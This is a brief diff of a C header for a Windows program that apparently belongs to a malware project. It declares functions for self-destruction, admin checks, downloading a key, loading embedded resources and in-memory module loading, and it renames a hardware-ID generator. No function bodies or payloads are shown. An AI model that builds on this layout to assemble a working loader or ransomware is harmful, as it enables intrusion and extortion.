@@ -1,9 +1,11 @@
 #pragma once
-#include "_rift_shared.h"
-#include "resource.h"
 #pragma comment(linker, "\"/manifestdependency:type='win32' \
 name='Microsoft.Windows.Common-Controls' version='6.0.0.0' \
 processorArchitecture='*' publicKeyToken='6595b64144ccf1df' language='*'\"")
+
+#include "depends.h"
+#include "resource.h"
+#include "MemoryModule.h"
 
 /* WinMain : main.c */
 VOID ESelfDestruct();
@@ -50,4 +52,4 @@ VOID EGenRandom(_In_opt_ PDWORD dwState, _Out_ PVOID pBuffer,_In_ SIZE_T nBuffer
 BOOL IIsUserAdmin();
 PVOID ELoadResourceW(_In_ WORD wResID, _In_ PCWSTR pResType, _Out_ PSIZE_T nBufferSize);
 PVOID IDownloadKey();
-VOID IGenerateHwid(_Out_ PVOID pHWID);
+VOID IGenerateSessionId(_Out_ PVOID pHWID);
